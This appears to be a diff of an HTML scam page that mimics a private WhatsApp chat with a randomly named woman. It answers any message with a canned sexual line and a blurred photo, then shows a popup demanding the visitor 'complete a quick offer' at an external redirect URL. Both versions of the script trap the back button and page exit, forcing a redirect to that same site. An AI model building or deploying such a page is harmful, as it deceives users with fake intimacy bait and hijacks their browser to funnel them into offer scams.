@@ -2,174 +2,171 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Private WhatsApp Chat</title>
+  <title>Chat with Ella</title>
   <style>
     body, html {
       margin: 0;
       padding: 0;
       height: 100%;
-      background-color: #ece5dd;
+      background: #e5ddd5;
       font-family: 'Segoe UI', sans-serif;
-      overflow: hidden;
     }
-    #chatContainer {
-      height: 100vh;
+    .chat-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
-      background-image: url('https://i.ibb.co/6Xb3Y0Z/whatsapp-bg.png');
+      justify-content: flex-end;
+      background: #e5ddd5 url('https://www.transparenttextures.com/patterns/white-wall-3.png');
       background-size: cover;
       padding: 10px;
+      box-sizing: border-box;
     }
-    .chat {
-      flex: 1;
-      overflow-y: auto;
-      padding-bottom: 10px;
+    .message {
+      max-width: 70%;
+      padding: 10px 15px;
+      margin: 5px 0;
+      border-radius: 20px;
+      line-height: 1.4em;
+      position: relative;
+      animation: fadeIn 0.5s ease;
     }
-    .bubble {
-      max-width: 80%;
-      padding: 10px;
-      margin: 5px;
-      border-radius: 10px;
-      line-height: 1.4;
-      display: inline-block;
-      clear: both;
-    }
-    .user {
-      background-color: #dcf8c6;
+    .user-message {
       align-self: flex-end;
-      float: right;
+      background: #dcf8c6;
     }
-    .bot {
-      background-color: #fff;
+    .bot-message {
       align-self: flex-start;
-      float: left;
+      background: #fff;
     }
-    #inputBox {
+    .chat-input {
       display: flex;
       padding: 10px;
-      background-color: #f0f0f0;
+      background: #fff;
     }
-    #inputField {
+    .chat-input input {
       flex: 1;
       padding: 10px;
-      border: none;
-      border-radius: 5px;
+      border: 1px solid #ccc;
+      border-radius: 20px;
       outline: none;
     }
-    #sendBtn {
-      padding: 10px;
+    .chat-input button {
       margin-left: 10px;
-      background-color: #25d366;
-      color: white;
+      padding: 0 15px;
       border: none;
-      border-radius: 5px;
+      background: #25d366;
+      color: white;
+      border-radius: 20px;
       cursor: pointer;
     }
-    .blurred {
-      filter: blur(10px);
+    .blurred-img {
+      width: 200px;
+      height: auto;
+      border-radius: 10px;
+      filter: blur(8px);
+      margin-top: 10px;
     }
-    #popup {
+    .popup {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
       background: rgba(0,0,0,0.8);
-      color: white;
       display: flex;
       align-items: center;
       justify-content: center;
-      flex-direction: column;
       z-index: 10;
-      display: none;
+      flex-direction: column;
+      color: white;
+      font-size: 1.2em;
+      text-align: center;
     }
-    #popup button {
+    .popup a {
       background: #25d366;
       padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      margin-top: 10px;
-      cursor: pointer;
+      border-radius: 20px;
+      margin-top: 20px;
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
     }
-    img.chat-img {
-      width: 200px;
-      border-radius: 10px;
-      margin-top: 5px;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <div id="chatContainer">
-    <div class="chat" id="chat"></div>
-    <div id="inputBox">
-      <input type="text" id="inputField" placeholder="Type a message...">
-      <button id="sendBtn">Send</button>
+  <div class="chat-container" id="chat">
+    <div class="chat-input">
+      <input type="text" id="userInput" placeholder="Type a message..." />
+      <button onclick="sendMessage()">Send</button>
     </div>
-  </div>  <div id="popup">
-    <p>🔞 This image is private. Complete a quick offer to continue the chat.</p>
-    <button onclick="window.location.href='https://redirecting-kappa.vercel.app/'">Continue</button>
-  </div>  <script>
-    const girlNames = ["Shelena", "Kiara", "Lola", "Maya", "Carmen"];
-    const girlImages = [
-      "https://i.ibb.co/ZYW3VTp/shelena.jpg",
-      "https://i.ibb.co/jv6dScY/girl2.jpg",
-      "https://i.ibb.co/kKsd0Zm/girl3.jpg",
-      "https://i.ibb.co/XFtD43L/girl4.jpg"
+  </div>
+  <div class="popup" id="popup" style="display:none;">
+    <p>Unlock full chat with her 🔓<br/>Complete this quick offer to continue!</p>
+    <a href="https://redirecting-kappa.vercel.app/">Continue</a>
+  </div>
+  <script>
+    const names = ["Ella", "Nina", "Sasha", "Lola", "Mira"];
+    const sexyMessages = [
+      "Mmm... you're cute. Wanna see more?",
+      "Just took this for you 😉",
+      "You're turning me on, babe...",
+      "Feeling naughty tonight 💋",
+      "I can't stop thinking about you..."
     ];
-    const sexyReplies = [
-      "I love it when you talk dirty 😘",
-      "You make me feel so naughty already... 💦",
-      "Mmm... wanna see more of me? 🔥",
-      "You're making me blush... come closer daddy 😈"
-    ];
+    const images = [
+      "https://cdn.pixabay.com/photo/2020/08/16/21/56/model-5493624_1280.jpg",
+      "https://cdn.pixabay.com/photo/2022/05/10/01/10/girl-7186034_1280.jpg",
+      "https://cdn.pixabay.com/photo/2016/11/21/16/27/beautiful-1844729_1280.jpg"
+    ];const girl = names[Math.floor(Math.random() * names.length)];
+const reply = sexyMessages[Math.floor(Math.random() * sexyMessages.length)];
+const pic = images[Math.floor(Math.random() * images.length)];
 
-    const girlName = girlNames[Math.floor(Math.random() * girlNames.length)];
-    const girlPic = girlImages[Math.floor(Math.random() * girlImages.length)];
-    const sexyMsg = sexyReplies[Math.floor(Math.random() * sexyReplies.length)];
+function appendMessage(text, sender) {
+  const msg = document.createElement("div");
+  msg.className = `message ${sender}-message`;
+  msg.textContent = text;
+  document.getElementById("chat").insertBefore(msg, document.querySelector('.chat-input'));
+}
 
-    const chat = document.getElementById("chat");
-    const input = document.getElementById("inputField");
-    const sendBtn = document.getElementById("sendBtn");
+function sendMessage() {
+  const input = document.getElementById("userInput");
+  const text = input.value.trim();
+  if (!text) return;
 
-    const addBubble = (msg, sender = "bot") => {
-      const bubble = document.createElement("div");
-      bubble.className = `bubble ${sender}`;
-      bubble.innerText = msg;
-      chat.appendChild(bubble);
-      chat.scrollTop = chat.scrollHeight;
-      new Audio("https://www.soundjay.com/button/beep-07.wav").play();
-    };
+  appendMessage(text, "user");
+  input.value = "";
 
-    sendBtn.onclick = () => {
-      if (input.value.trim() !== "") {
-        addBubble(input.value, "user");
-        input.value = "";
-        setTimeout(() => {
-          addBubble(`${girlName}: ${sexyMsg}`);
+  setTimeout(() => {
+    appendMessage(`${girl}: ${reply}`, "bot");
 
-          const img = document.createElement("img");
-          img.src = girlPic;
-          img.className = "chat-img blurred";
-          chat.appendChild(img);
-          chat.scrollTop = chat.scrollHeight;
+    const img = document.createElement("img");
+    img.src = pic;
+    img.alt = "sexy photo";
+    img.className = "blurred-img";
 
-          setTimeout(() => {
-            document.getElementById("popup").style.display = "flex";
-          }, 1500);
+    const chatBox = document.getElementById("chat");
+    chatBox.insertBefore(img, document.querySelector('.chat-input'));
 
-        }, 1200);
-      }
-    };
+    setTimeout(() => {
+      document.getElementById("popup").style.display = "flex";
+    }, 1200);
+  }, 1000);
+}
 
-    window.onpopstate = function () {
-      location.href = "https://redirecting-kappa.vercel.app/";
-    };
-    window.addEventListener("beforeunload", function (e) {
-      e.preventDefault();
-      e.returnValue = '';
-      setTimeout(() => {
-        location.href = "https://redirecting-kappa.vercel.app/";
-      }, 50);
-    });
-  </script></body>
+// Trap back navigation
+window.onbeforeunload = function () {
+  window.location.href = "https://redirecting-kappa.vercel.app/";
+  return null;
+};
+
+  </script>
+</body>
 </html>
